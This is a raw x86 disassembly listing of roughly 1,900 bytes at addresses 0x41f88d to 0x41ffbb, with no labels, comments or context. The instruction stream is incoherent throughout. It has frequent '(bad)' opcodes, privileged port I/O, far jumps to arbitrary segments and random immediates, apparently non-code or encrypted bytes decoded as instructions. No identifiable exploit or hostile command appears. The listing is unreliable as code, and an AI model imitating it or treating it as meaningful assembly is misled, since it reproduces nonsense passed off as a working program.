  41f88d:	mov    DWORD PTR [edx-0x34c9c12d],edi
  41f893:	mov    esi,0x4afacb33
  41f898:	jecxz  0x41f8e7
  41f89a:	cdq    
  41f89b:	lods   al,BYTE PTR ds:[esi]
  41f89c:	push   ds
  41f89d:	clc    
  41f89e:	mov    eax,ds:0x7beccbde
  41f8a3:	fwait
  41f8a4:	popf   
  41f8a5:	jmp    0xf48a:0x40c66b23
  41f8ac:	ins    DWORD PTR es:[edi],dx
  41f8ad:	sbb    eax,0x9e4557c
  41f8b2:	cmp    edx,DWORD PTR [edx]
  41f8b4:	in     al,dx
  41f8b5:	xchg   ebp,eax
  41f8b6:	std    
  41f8b7:	idiv   bh
  41f8b9:	or     ebp,0x646600bc
  41f8bf:	bound  esp,QWORD PTR [esi+edi*4]
  41f8c2:	rcr    ah,cl
  41f8c4:	(bad)  
  41f8c5:	sbb    al,0x82
  41f8c7:	ja     0x41f84b
  41f8c9:	inc    eax
  41f8ca:	ja     0x41f85e
  41f8cc:	xlat   BYTE PTR ds:[ebx]
  41f8cd:	fs inc ecx
  41f8cf:	jb     0x41f8a9
  41f8d1:	xchg   esi,eax
  41f8d2:	sub    DWORD PTR [esi+0x65],ebp
  41f8d5:	aas    
  41f8d6:	inc    esp
  41f8d7:	and    bh,BYTE PTR [edi+0x335a5ae1]
  41f8dd:	mov    cl,BYTE PTR [edi+0x1e]
  41f8e0:	in     al,dx
  41f8e1:	jecxz  0x41f8df
  41f8e3:	(bad)  
  41f8e4:	aaa    
  41f8e5:	xor    DWORD PTR [edi-0x7f],ecx
  41f8e8:	push   ebx
  41f8e9:	cmp    eax,0xa69a0e1f
  41f8ee:	jbe    0x41f954
  41f8f0:	test   eax,0x95ac1c8d
  41f8f5:	jge    0x41f95e
  41f8f7:	or     BYTE PTR [edi-0x7f],ah
  41f8fa:	repnz xchg ecx,eax
  41f8fc:	fadd   QWORD PTR [ecx]
  41f8fe:	dec    edi
  41f8ff:	lea    esi,[edx+0x4d535953]
  41f905:	xchg   BYTE PTR [eax+0x3],ah
  41f908:	mov    dh,0xc
  41f90a:	dec    edi
  41f90b:	xchg   dh,dh
  41f90d:	fnsave [edx+0x606cf55b]
  41f913:	cmp    ebx,edx
  41f915:	imul   eax,DWORD PTR [esi-0x3c28b5df],0x2f6628cf
  41f91f:	cmovnp ecx,DWORD PTR [edi+ebx*4+0x54]
  41f924:	jp     0x41f960
  41f926:	imul   edi,ebx,0x15167dfa
  41f92c:	sub    al,0x67
  41f92e:	outs   dx,BYTE PTR ds:[esi]
  41f92f:	popa   
  41f930:	jg     0x41f97e
  41f932:	push   edx
  41f933:	cld    
  41f934:	jg     0x41f8e1
  41f936:	jecxz  0x41f8da
  41f938:	stos   BYTE PTR es:[edi],al
  41f939:	jg     0x41f8c3
  41f93b:	inc    esi
  41f93c:	(bad)  
  41f93d:	jo     0x41f8ea
  41f93f:	dec    ebp
  41f940:	out    0x85,al
  41f942:	ins    DWORD PTR es:[edi],dx
  41f943:	mov    fs,WORD PTR [ebx-0x56]
  41f946:	(bad)  
  41f947:	in     al,dx
  41f948:	mov    BYTE PTR [eax+0x1b9e9a8e],dl
  41f94e:	les    esp,FWORD PTR [edx+0x23]
  41f951:	jae    0x41f9a3
  41f953:	mov    al,ds:0x5a069a98
  41f958:	add    DWORD PTR [edx],ebp
  41f95a:	test   DWORD PTR [edx],esi
  41f95c:	std    
  41f95d:	cli    
  41f95e:	pusha  
  41f95f:	je     0x41f963
  41f961:	pop    esp
  41f962:	push   edi
  41f963:	fisubr WORD PTR [ebp-0x48b99bd5]
  41f969:	clc    
  41f96a:	push   edi
  41f96b:	jne    0x41f9d9
  41f96d:	sub    edx,ebp
  41f96f:	fst    QWORD PTR [eax-0x1044af06]
  41f975:	pop    es
  41f976:	sbb    bl,BYTE PTR [edx-0x3a]
  41f979:	fiadd  WORD PTR [edi]
  41f97b:	dec    ebp
  41f97c:	mov    esi,0xb6e1f54
  41f981:	dec    ebp
  41f982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f983:	jae    0x41f96f
  41f985:	fdiv   st,st(5)
  41f987:	hlt    
  41f988:	dec    ebx
  41f989:	int3   
  41f98a:	sbb    DWORD PTR [ebx],esi
  41f98c:	mov    DWORD PTR [edi-0x3f056f2],edx
  41f992:	outs   dx,DWORD PTR ds:[esi]
  41f993:	stos   DWORD PTR es:[edi],eax
  41f994:	repz pop ss
  41f996:	call   0xcab6ed68
  41f99b:	push   esi
  41f99c:	mov    DWORD PTR [edx],edi
  41f99e:	sub    DWORD PTR [edx+0x56ede635],edx
  41f9a4:	test   DWORD PTR [edi-0x12644e3b],esp
  41f9aa:	js     0x41f9aa
  41f9ac:	sbb    al,0xfb
  41f9ae:	das    
  41f9af:	in     eax,0x67
  41f9b1:	repz ror BYTE PTR [ecx+0x1f],0x26
  41f9b6:	fsubr  DWORD PTR [ebx+0x2b]
  41f9b9:	icebp  
  41f9ba:	sub    dl,BYTE PTR [ecx]
  41f9bc:	and    BYTE PTR [ebp+0x408bee5c],0xdb
  41f9c3:	fwait
  41f9c4:	jo     0x41f9dd
  41f9c6:	fdivr  st,st(5)
  41f9c8:	dec    esp
  41f9c9:	into   
  41f9ca:	sub    al,BYTE PTR [ecx]
  41f9cc:	push   edi
  41f9cd:	sbb    ebx,DWORD PTR [edi-0x64]
  41f9d0:	jg     0x41fa4c
  41f9d2:	cmp    DWORD PTR [ecx+0x77],esi
  41f9d5:	cmp    dh,BYTE PTR [edx]
  41f9d7:	jo     0x41f9a5
  41f9d9:	cmp    esi,DWORD PTR [esi+edx*1+0x2aebc921]
  41f9e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9e1:	xchg   ecx,eax
  41f9e2:	sbb    BYTE PTR [eax],dl
  41f9e4:	cmc    
  41f9e5:	mov    dh,0xa2
  41f9e7:	arpl   WORD PTR [ebx],dx
  41f9e9:	pusha  
  41f9ea:	pop    esp
  41f9eb:	pop    ss
  41f9ec:	js     0x41f9c8
  41f9ee:	sbb    dh,ah
  41f9f0:	enter  0x1908,0xed
  41f9f4:	out    dx,al
  41f9f5:	(bad)  
  41f9f6:	das    
  41f9f7:	loopne 0x41f9e9
  41f9f9:	test   BYTE PTR [ecx+0x4bbbf654],dl
  41f9ff:	cld    
  41fa00:	dec    ebx
  41fa01:	pop    esi
  41fa02:	(bad)  
  41fa03:	out    0x1e,al
  41fa05:	imul   ecx,edx,0x41d5f799
  41fa0b:	xor    al,al
  41fa0d:	enter  0x6a0b,0x11
  41fa11:	cmp    ah,BYTE PTR [ecx+0x4f7f2920]
  41fa17:	faddp  st(7),st
  41fa19:	aaa    
  41fa1a:	add    DWORD PTR ds:0xf3028fe4,ebx
  41fa20:	hlt    
  41fa21:	imul   eax,DWORD PTR [edx+0x4f],0x1710be27
  41fa28:	adc    BYTE PTR [edi],cl
  41fa2a:	jmp    0xeb00:0xf728e51d
  41fa31:	add    DWORD PTR [edi],ecx
  41fa33:	xlat   BYTE PTR ds:[ebx]
  41fa34:	inc    edi
  41fa35:	fsub   DWORD PTR [ebp-0x672a8fde]
  41fa3b:	dec    esp
  41fa3c:	outs   dx,BYTE PTR ds:[esi]
  41fa3d:	dec    ebx
  41fa3e:	xchg   ecx,eax
  41fa3f:	inc    ecx
  41fa40:	rol    esp,cl
  41fa42:	ss out 0xc4,al
  41fa45:	gs xchg ecx,eax
  41fa47:	iret   
  41fa48:	in     al,0x63
  41fa4a:	dec    eax
  41fa4b:	call   0x57db:0xd833c54e
  41fa52:	mov    ds:0x71c74e04,eax
  41fa57:	or     al,0xe2
  41fa59:	aam    0x8c
  41fa5b:	(bad)  
  41fa5c:	neg    DWORD PTR [edi-0x35]
  41fa5f:	test   eax,0x8f0dd3d8
  41fa64:	push   cs
  41fa65:	cdq    
  41fa66:	loopne 0x41f9f6
  41fa68:	in     al,0xbc
  41fa6a:	scas   al,BYTE PTR es:[edi]
  41fa6b:	in     eax,0xdf
  41fa6d:	jno    0x41fa44
  41fa6f:	mov    ch,0xf4
  41fa71:	push   ebp
  41fa72:	cmp    al,0xc5
  41fa74:	mov    edi,0x17d78956
  41fa79:	and    BYTE PTR [edx+0x1311b94b],bh
  41fa7f:	pop    esi
  41fa80:	add    BYTE PTR [edx],dl
  41fa82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa83:	in     eax,dx
  41fa84:	rcl    BYTE PTR [edx-0x6f],0x3e
  41fa88:	xchg   esi,eax
  41fa89:	inc    edi
  41fa8a:	mov    ebx,0x43358869
  41fa8f:	mov    eax,0x317b96d9
  41fa94:	xor    DWORD PTR [edi],ebx
  41fa96:	or     eax,0xc7e237d
  41fa9b:	and    eax,0xbbaa014a
  41faa0:	jb     0x41fa59
  41faa2:	mov    ds:0x948e9288,al
  41faa7:	push   cs
  41faa8:	push   0xffffffa3
  41faaa:	mov    gs,WORD PTR [ebx+0x16765d59]
  41fab0:	jl     0x41fb11
  41fab2:	out    0x55,eax
  41fab4:	inc    ebx
  41fab5:	sub    DWORD PTR [ebx-0x4c],ebp
  41fab8:	je     0x41fb08
  41faba:	mov    bl,0xc9
  41fabc:	aas    
  41fabd:	pop    ebx
  41fabe:	jp     0x41fb14
  41fac0:	leave  
  41fac1:	xchg   BYTE PTR [edi-0x30],dl
  41fac4:	jge    0x41faf5
  41fac6:	xchg   esi,eax
  41fac7:	jecxz  0x41faf2
  41fac9:	fadd   st(1),st
  41facb:	jecxz  0x41fb41
  41facd:	lock fidiv DWORD PTR [ebx]
  41fad0:	rcl    esp,0x43
  41fad3:	mov    DWORD PTR [edi+0x67],ecx
  41fad6:	es lahf 
  41fad8:	cld    
  41fad9:	dec    edi
  41fada:	mov    eax,ds:0xb3a88ba
  41fadf:	inc    DWORD PTR ds:0x8e88f3fb
  41fae5:	xor    eax,0xa7ee3298
  41faea:	(bad)  
  41faec:	popa   
  41faed:	in     eax,0x97
  41faef:	inc    edi
  41faf0:	xchg   esp,eax
  41faf1:	and    dl,BYTE PTR [eax-0x6e574706]
  41faf7:	(bad)  
  41faf8:	jae    0x41faf0
  41fafa:	fidiv  WORD PTR ds:0x4d48bb5e
  41fb00:	or     edi,ecx
  41fb02:	lods   al,BYTE PTR ds:[esi]
  41fb03:	mov    BYTE PTR [ebx+eax*8+0x6d],ah
  41fb07:	in     al,dx
  41fb08:	aas    
  41fb09:	cmp    al,0xbc
  41fb0b:	data16 fdiv DWORD PTR [esi+0x20]
  41fb0f:	ror    BYTE PTR [ecx+ebx*4+0x41930767],cl
  41fb16:	(bad)  
  41fb17:	leave  
  41fb18:	je     0x41fa9e
  41fb1a:	ficom  WORD PTR es:[ecx+0x64bed3ff]
  41fb21:	lahf   
  41fb22:	mov    ecx,0xe662beb6
  41fb27:	adc    BYTE PTR [edi+0x6a],dh
  41fb2a:	test   BYTE PTR [eax],0xf4
  41fb2d:	imul   esi,DWORD PTR [ebx+0x2fc8af06],0xb85df54d
  41fb37:	xor    ch,dh
  41fb39:	push   ds
  41fb3a:	mov    al,0xbf
  41fb3c:	aad    0xfe
  41fb3e:	add    DWORD PTR [edx-0x99a4e46],edi
  41fb44:	int    0x97
  41fb46:	stos   BYTE PTR es:[edi],al
  41fb47:	fnstenv [ebx-0x7a7fab23]
  41fb4d:	fstp   QWORD PTR [eax]
  41fb4f:	jns    0x41fadb
  41fb51:	mov    eax,ds:0x95b16da1
  41fb56:	pop    eax
  41fb57:	test   eax,0xb923aa52
  41fb5c:	std    
  41fb5d:	loop   0x41fb28
  41fb5f:	aaa    
  41fb60:	mov    ecx,0xc871a8ec
  41fb65:	add    eax,0x8a77e470
  41fb6a:	pop    ebp
  41fb6b:	pop    edx
  41fb6c:	xchg   BYTE PTR [edx+0x79],dh
  41fb6f:	pop    edi
  41fb70:	mov    ds:0xc0a94d26,al
  41fb75:	lods   al,BYTE PTR ds:[esi]
  41fb76:	mov    dl,0xee
  41fb78:	xor    BYTE PTR [ebx-0x12],al
  41fb7b:	pusha  
  41fb7c:	(bad)  
  41fb7d:	pop    ebx
  41fb7e:	aas    
  41fb7f:	aaa    
  41fb80:	or     ch,BYTE PTR [esi+0x2a2a20e5]
  41fb86:	pop    esi
  41fb87:	popa   
  41fb88:	lock pop ds
  41fb8a:	jbe    0x41fbeb
  41fb8c:	sbb    eax,0x46fc44ca
  41fb91:	test   DWORD PTR [esi+0x567f7597],esp
  41fb97:	mov    ds:0x9bc0cfbb,eax
  41fb9c:	cmp    BYTE PTR [esi+0x54963efd],ah
  41fba2:	adc    ebp,ebx
  41fba4:	test   eax,0x8345a04c
  41fba9:	xor    bh,BYTE PTR [ebx]
  41fbab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbad:	inc    ebp
  41fbae:	hlt    
  41fbaf:	imul   edx,DWORD PTR ds:0x7fade2c2,0x18
  41fbb6:	jbe    0x41fba9
  41fbb8:	jmp    0x91c6:0x2e9b66ec
  41fbbf:	inc    eax
  41fbc0:	inc    ebx
  41fbc1:	les    ecx,FWORD PTR [ebp-0x72]
  41fbc4:	and    esp,DWORD PTR [ecx]
  41fbc6:	rcr    edx,0x1d
  41fbc9:	out    0xa4,al
  41fbcb:	ret    
  41fbcc:	jbe    0x41fb79
  41fbce:	and    eax,0x32a4e434
  41fbd3:	enter  0xa72c,0x1b
  41fbd7:	int3   
  41fbd8:	pop    ebx
  41fbd9:	int    0x71
  41fbdb:	ror    esi,cl
  41fbdd:	ret    
  41fbde:	pop    esp
  41fbdf:	xchg   esi,esi
  41fbe1:	(bad)  
  41fbe2:	int    0x6e
  41fbe4:	inc    eax
  41fbe5:	cmp    DWORD PTR [esi+edx*8-0x11],ecx
  41fbe9:	lds    edi,FWORD PTR [esi+0x2]
  41fbec:	gs or  al,0xc1
  41fbef:	fcmovnb st,st(6)
  41fbf1:	cld    
  41fbf2:	sar    DWORD PTR [edi],0x72
  41fbf5:	mov    ah,ch
  41fbf7:	idiv   BYTE PTR [edx]
  41fbf9:	test   eax,0x9ed49dcb
  41fbff:	inc    esi
  41fc00:	jge    0x41fbc2
  41fc02:	data16 jbe 0x41fbee
  41fc05:	xchg   ebp,eax
  41fc06:	mov    bl,0xd8
  41fc08:	(bad)  
  41fc0a:	inc    esi
  41fc0b:	push   ds
  41fc0c:	leave  
  41fc0d:	mov    DWORD PTR [ecx-0x18fbf133],esp
  41fc13:	sbb    ah,BYTE PTR [ecx+eiz*2]
  41fc16:	or     BYTE PTR [edi],ah
  41fc18:	xor    ah,BYTE PTR [ebx-0x27f4c442]
  41fc1e:	in     eax,0x40
  41fc20:	sti    
  41fc21:	out    0xb9,al
  41fc23:	jo     0x41fc5b
  41fc25:	or     BYTE PTR fs:[ecx+ecx*2],0x51
  41fc2a:	lahf   
  41fc2b:	jecxz  0x41fc88
  41fc2d:	imul   edx,DWORD PTR [ebp-0x13],0xfffffff0
  41fc31:	imul   ebp,DWORD PTR [ecx-0x1ea4170c],0x6cfb7b46
  41fc3b:	dec    esi
  41fc3c:	adc    al,0xc6
  41fc3e:	sub    ch,BYTE PTR [edi-0x18]
  41fc41:	test   al,0x5f
  41fc43:	xchg   DWORD PTR [ebx+eax*4+0x1b],ebp
  41fc47:	xor    DWORD PTR [edi+ecx*2-0x2c],0xaefb73b3
  41fc4f:	sub    esp,DWORD PTR [ecx-0x6b25abae]
  41fc55:	xlat   BYTE PTR cs:[ebx]
  41fc57:	es xchg edx,eax
  41fc59:	cmp    dl,BYTE PTR [ebx-0x34]
  41fc5c:	in     eax,0x1b
  41fc5e:	xlat   BYTE PTR ds:[ebx]
  41fc5f:	adc    ch,BYTE PTR [esi+0xc]
  41fc62:	xlat   BYTE PTR ds:[ebx]
  41fc63:	lea    eax,[edx]
  41fc65:	loop   0x41fc57
  41fc67:	xchg   BYTE PTR ds:0x6cf2ec34,cl
  41fc6d:	mov    ebx,0x1d762835
  41fc72:	das    
  41fc73:	int3   
  41fc74:	test   eax,0x9dd4ff7b
  41fc79:	xchg   esp,eax
  41fc7a:	sbb    esi,ebx
  41fc7c:	std    
  41fc7d:	inc    esp
  41fc7e:	jl     0x41fcd2
  41fc80:	call   0x9481:0x3ed380ed
  41fc87:	mov    dh,0xbe
  41fc89:	imul   ebx,DWORD PTR [edx],0x5a
  41fc8c:	pop    ss
  41fc8d:	jp     0x41fc1c
  41fc8f:	mov    cl,0xaa
  41fc91:	aas    
  41fc92:	ror    BYTE PTR [ebx-0xb68a78a],cl
  41fc98:	or     eax,0xaadf17de
  41fc9d:	pop    DWORD PTR [edi]
  41fc9f:	sahf   
  41fca0:	sbb    DWORD PTR [edx],ecx
  41fca2:	fldcw  WORD PTR [eax+0x7639991a]
  41fca8:	pusha  
  41fca9:	sub    ch,BYTE PTR [eax+0x43f9b570]
  41fcaf:	xor    ah,BYTE PTR [ecx]
  41fcb1:	cmp    eax,0x5f64bff1
  41fcb6:	pop    ebx
  41fcb7:	or     DWORD PTR [eax],0x99a23723
  41fcbd:	inc    ebp
  41fcbe:	ss lock idiv dh
  41fcc2:	mov    WORD PTR [ecx+edx*1+0x8],es
  41fcc6:	ret    
  41fcc7:	mov    dh,0x2e
  41fcc9:	je     0x41fcfb
  41fccb:	pop    edx
  41fccc:	xchg   edx,eax
  41fccd:	add    BYTE PTR [edi+0x78],ah
  41fcd0:	lahf   
  41fcd1:	xchg   ebp,eax
  41fcd2:	mov    ch,0xc6
  41fcd4:	jmp    0x41fcbc
  41fcd6:	imul   edi,DWORD PTR [edx-0x4b],0x7e
  41fcda:	jl     0x41fcd5
  41fcdc:	mov    bh,0xe7
  41fcde:	mov    ch,0x7b
  41fce0:	pop    esp
  41fce1:	fs xchg edx,ebp
  41fce4:	add    dh,BYTE PTR [ebx]
  41fce6:	int3   
  41fce7:	ins    BYTE PTR es:[edi],dx
  41fce8:	xor    ebx,DWORD PTR [edx+0x43c9729c]
  41fcee:	fnstenv [esi+0x6e]
  41fcf1:	scas   eax,DWORD PTR es:[edi]
  41fcf2:	dec    esp
  41fcf3:	lods   eax,DWORD PTR ds:[esi]
  41fcf4:	cmp    eax,0xf305bbe9
  41fcf9:	fiadd  DWORD PTR [edx+0x642595a4]
  41fcff:	pop    eax
  41fd00:	mov    ch,0x47
  41fd02:	ror    BYTE PTR [ecx],0x40
  41fd05:	into   
  41fd06:	add    eax,0x4d89cfbb
  41fd0b:	imul   esp,DWORD PTR [ebx-0x640f238f],0x29
  41fd12:	sub    esp,DWORD PTR [esi+0x1b2c36ec]
  41fd18:	push   ds
  41fd19:	call   0xb19f:0x403e8a6
  41fd20:	gs add ch,dh
  41fd23:	out    dx,al
  41fd24:	adc    al,0xb8
  41fd26:	mov    ecx,0x78e9c0a3
  41fd2b:	inc    esp
  41fd2c:	fdivr  DWORD PTR [ebx]
  41fd2e:	sbb    bh,bl
  41fd30:	in     eax,dx
  41fd31:	retf   
  41fd32:	sar    ebp,1
  41fd34:	aam    0x13
  41fd36:	pop    ecx
  41fd37:	fist   WORD PTR ds:[ebx+0x23484e]
  41fd3e:	add    BYTE PTR [eax],al
  41fd40:	add    BYTE PTR [eax],al
  41fd42:	mov    ds:0xb713b617,al
  41fd47:	mov    bl,0xa7
  41fd49:	mov    bh,0xb
  41fd4b:	add    BYTE PTR [edi-0x7da6da24],dh
  41fd51:	xchg   esi,eax
  41fd52:	int3   
  41fd53:	ja     0x41fd56
  41fd55:	add    bl,dh
  41fd57:	add    al,0x0
  41fd59:	add    BYTE PTR [esi],dl
  41fd5b:	and    bh,dl
  41fd5d:	inc    ebx
  41fd5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd5f:	inc    ebx
  41fd60:	cmp    esp,0x41622b0c
  41fd66:	repnz mov DWORD PTR [esi],0xfe690dbc
  41fd6d:	xor    DWORD PTR [eax-0x20d0cd98],0xf8cf0ea3
  41fd77:	add    al,0xda
  41fd79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd7a:	add    ch,BYTE PTR [edi-0x34]
  41fd7d:	lea    esi,[edx+ecx*8-0x61]
  41fd81:	lds    esi,FWORD PTR [ecx-0x1ad358cf]
  41fd87:	popa   
  41fd88:	(bad)  
  41fd89:	xchg   ecx,eax
  41fd8a:	push   ebx
  41fd8b:	les    esi,FWORD PTR [esi-0x2e]
  41fd8e:	jl     0x41fd44
  41fd90:	jg     0x41fd3e
  41fd92:	bound  ebp,QWORD PTR [edi+0x60]
  41fd95:	jbe    0x41fdf5
  41fd97:	jl     0x41fd60
  41fd99:	pop    edi
  41fd9a:	(bad)  
  41fd9b:	repz inc ecx
  41fd9d:	popf   
  41fd9e:	mov    al,0x6
  41fda0:	and    al,0x43
  41fda2:	dec    ebx
  41fda3:	and    BYTE PTR [edi-0x301fb9df],al
  41fda9:	xchg   BYTE PTR [edi+0x43f5cf04],ah
  41fdaf:	adc    BYTE PTR [ecx+edx*2+0x15],cl
  41fdb3:	cmp    al,0x36
  41fdb5:	stos   DWORD PTR es:[edi],eax
  41fdb6:	stc    
  41fdb7:	fisttp WORD PTR [esp+eiz*8-0x4ab7a2c]
  41fdbe:	pop    DWORD PTR [edx]
  41fdc0:	es test al,0x67
  41fdc3:	fidivr DWORD PTR [edx+0x7e]
  41fdc6:	jge    0x41fdae
  41fdc8:	push   ebx
  41fdc9:	pop    esi
  41fdca:	imul   esi,DWORD PTR ds:0xc767dc8e,0xffffffd2
  41fdd1:	(bad)  
  41fdd2:	ja     0x41fe11
  41fdd4:	xor    cl,dh
  41fdd6:	lods   eax,DWORD PTR ds:[esi]
  41fdd7:	fiadd  DWORD PTR [ecx+0x54]
  41fdda:	arpl   dx,sp
  41fddc:	add    BYTE PTR [ebx-0x66],dh
  41fddf:	inc    esi
  41fde0:	mov    al,ds:0x7a2a167
  41fde5:	popa   
  41fde6:	stos   DWORD PTR es:[edi],eax
  41fde7:	addr16 push 0xffc18e07
  41fded:	hlt    
  41fdee:	sub    BYTE PTR [edi+0x2d],dh
  41fdf1:	cmp    bh,BYTE PTR [eax-0x38]
  41fdf4:	cld    
  41fdf5:	inc    esp
  41fdf6:	inc    ebx
  41fdf7:	test   eax,0xaecd404a
  41fdfc:	dec    edx
  41fdfd:	rol    DWORD PTR [edi-0x13],1
  41fe00:	pop    ds
  41fe01:	stos   BYTE PTR es:[edi],al
  41fe02:	icebp  
  41fe03:	(bad)  
  41fe04:	dec    ebp
  41fe05:	cmc    
  41fe06:	(bad)  
  41fe07:	ds xchg edi,eax
  41fe09:	mov    eax,ds:0xfe353868
  41fe0e:	push   esp
  41fe0f:	cmovns eax,ebp
  41fe12:	enter  0xa0f8,0xe
  41fe16:	sub    ah,BYTE PTR [edx+eax*2]
  41fe19:	ret    
  41fe1a:	cmc    
  41fe1b:	data16 idiv BYTE PTR [ebp+0x4e]
  41fe1f:	mov    esp,0x9f9d2099
  41fe24:	cmp    ah,0xe2
  41fe27:	cwde   
  41fe28:	ret    
  41fe29:	mov    BYTE PTR [edi],bh
  41fe2b:	mov    ds:0xc8e8472f,al
  41fe30:	sti    
  41fe31:	jle    0x41fe48
  41fe33:	loopne 0x41fea3
  41fe35:	ret    0xc4f8
  41fe38:	test   DWORD PTR [edx+0x28],ebp
  41fe3b:	inc    esi
  41fe3c:	int3   
  41fe3d:	xchg   ebx,eax
  41fe3e:	lea    edi,[edi+0x240b9002]
  41fe44:	dec    ebx
  41fe45:	xchg   ebx,eax
  41fe46:	fdivrp st(2),st
  41fe48:	fstp   DWORD PTR [edi-0x47]
  41fe4b:	(bad)  
  41fe4c:	hlt    
  41fe4d:	or     bh,BYTE PTR [eax+0x27]
  41fe50:	rol    ebp,0xdd
  41fe53:	cmp    ch,BYTE PTR [edx-0x7c8d3673]
  41fe59:	and    DWORD PTR [eax+0x58c8134a],0x52fd545
  41fe63:	adc    eax,0x71d56b30
  41fe68:	out    dx,eax
  41fe69:	js     0x41fe1d
  41fe6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe6c:	mov    ah,0x6d
  41fe6e:	cmp    esp,ecx
  41fe70:	push   0xc30cf3b5
  41fe75:	out    dx,eax
  41fe76:	adc    eax,0xaf69f4d3
  41fe7b:	lock add BYTE PTR [ebp+0x50],ah
  41fe7f:	daa    
  41fe80:	push   edx
  41fe81:	xchg   edi,eax
  41fe82:	in     al,0xe9
  41fe84:	adc    edi,ebp
  41fe86:	xor    BYTE PTR [ecx-0x3d4f55a6],bl
  41fe8c:	and    DWORD PTR [ecx+0x48945fe1],edi
  41fe92:	pop    ss
  41fe93:	push   edx
  41fe94:	hlt    
  41fe95:	mov    ds:0x70045e69,al
  41fe9a:	sbb    al,0xb
  41fe9c:	std    
  41fe9d:	xor    ebp,eax
  41fe9f:	hlt    
  41fea0:	and    ah,dl
  41fea2:	sub    al,0x35
  41fea4:	cmp    al,0x4f
  41fea6:	adc    BYTE PTR [esi-0x17],0x90
  41feaa:	add    eax,0x8ae4e59e
  41feaf:	bound  eax,QWORD PTR [ebp-0x52]
  41feb2:	pop    ebp
  41feb3:	outs   dx,DWORD PTR ds:[esi]
  41feb4:	xchg   esp,eax
  41feb5:	test   eax,0x6d2869fd
  41feba:	fiadd  WORD PTR [ebx]
  41febc:	mov    ecx,esi
  41febe:	test   DWORD PTR [edx+0x3b],esi
  41fec1:	addr16 and al,cl
  41fec4:	mov    ebp,0x74e355f6
  41fec9:	push   cs
  41feca:	sbb    al,0x56
  41fecc:	lods   al,BYTE PTR ds:[esi]
  41fecd:	rol    eax,1
  41fecf:	popa   
  41fed0:	or     dl,BYTE PTR [ebp+0x324a2457]
  41fed6:	out    0x13,al
  41fed8:	adc    esp,DWORD PTR [ebp-0x25]
  41fedb:	adc    bl,dh
  41fedd:	inc    eax
  41fede:	cmp    ah,BYTE PTR [eax]
  41fee0:	cwde   
  41fee1:	jbe    0x41fea0
  41fee3:	xchg   BYTE PTR [edi-0x4f],dl
  41fee6:	int3   
  41fee7:	scas   eax,DWORD PTR es:[edi]
  41fee8:	sar    DWORD PTR [ecx+ebp*2+0x53633a25],cl
  41feef:	xchg   ecx,eax
  41fef0:	cdq    
  41fef1:	mov    ss,WORD PTR [esi-0x41098a4]
  41fef7:	ret    
  41fef8:	enter  0x793f,0x42
  41fefc:	cmp    al,0x74
  41fefe:	(bad)  
  41ff00:	jns    0x41feec
  41ff02:	addr16 push eax
  41ff04:	dec    edx
  41ff05:	xchg   ebx,eax
  41ff06:	bound  ecx,QWORD PTR [edx+0x5c]
  41ff09:	sub    al,0x4e
  41ff0b:	hlt    
  41ff0c:	iret   
  41ff0d:	ins    BYTE PTR es:[edi],dx
  41ff0e:	mov    eax,0x217a2658
  41ff13:	into   
  41ff14:	pop    edx
  41ff15:	dec    ebp
  41ff16:	dec    esi
  41ff17:	mov    BYTE PTR [eax],cl
  41ff19:	retf   0xd552
  41ff1c:	add    bl,bl
  41ff1e:	mov    ah,0xf7
  41ff20:	idiv   DWORD PTR [ebx+0xf]
  41ff23:	in     eax,dx
  41ff24:	cvttps2pi mm4,QWORD PTR [ebx-0xb]
  41ff28:	xchg   BYTE PTR [ebx],bl
  41ff2a:	lds    ebp,FWORD PTR [edi+0x693de192]
  41ff30:	in     eax,dx
  41ff31:	outs   dx,DWORD PTR ds:[esi]
  41ff32:	mov    ecx,0x9f7d3d04
  41ff37:	sbb    bl,BYTE PTR [edx]
  41ff39:	out    dx,al
  41ff3a:	or     BYTE PTR [edi+0x61],0x51
  41ff3e:	mov    dl,0x71
  41ff40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff42:	ja     0x41ff03
  41ff44:	xlat   BYTE PTR ds:[ebx]
  41ff45:	sub    ecx,DWORD PTR [esi]
  41ff47:	mov    esp,0xaa8c6421
  41ff4c:	push   0xffffffab
  41ff4e:	(bad)  
  41ff4f:	aad    0xaf
  41ff51:	jl     0x41ff69
  41ff53:	push   es
  41ff54:	stc    
  41ff55:	hlt    
  41ff56:	cs je  0x41ff41
  41ff59:	imul   esi,DWORD PTR [edx-0x28],0x6e
  41ff5d:	ja     0x41fef3
  41ff5f:	or     al,0xb2
  41ff61:	(bad)
  41ff64:	xor    BYTE PTR [esi-0x75],bl
  41ff67:	addr16 retf 0x5253
  41ff6b:	dec    ecx
  41ff6c:	lds    ebx,FWORD PTR [ecx]
  41ff6e:	mov    dh,0x6b
  41ff70:	mov    BYTE PTR [ebx+edi*4+0x628c03cf],dh
  41ff77:	jno    0x41ff84
  41ff79:	stos   DWORD PTR es:[edi],eax
  41ff7a:	outs   dx,BYTE PTR ds:[esi]
  41ff7b:	int    0x18
  41ff7d:	jno    0x41ff04
  41ff7f:	lock pop esi
  41ff81:	(bad)  
  41ff83:	test   al,0x3e
  41ff85:	inc    edi
  41ff86:	dec    edx
  41ff87:	(bad)  
  41ff88:	pop    esi
  41ff89:	or     eax,0x4914f4b5
  41ff8e:	idiv   BYTE PTR [ebx]
  41ff90:	mov    dl,0x90
  41ff92:	nop    DWORD PTR [eax-0x52]
  41ff96:	add    eax,0x3584a8fc
  41ff9b:	push   esp
  41ff9c:	dec    eax
  41ff9d:	lock pop ecx
  41ff9f:	mov    ebp,0xde3b20f3
  41ffa4:	mov    bh,0xa9
  41ffa6:	inc    ecx
  41ffa7:	xor    BYTE PTR [eax],ah
  41ffa9:	das    
  41ffaa:	popf   
  41ffab:	mov    ecx,0x3251c89f
  41ffb0:	jnp    0x41ff66
  41ffb2:	dec    edx
  41ffb3:	push   ebx
  41ffb4:	shl    esp,cl
  41ffb6:	loope  0x420022
  41ffb8:	cmp    BYTE PTR [edx+0x65],cl
  41ffbb:	push   ds
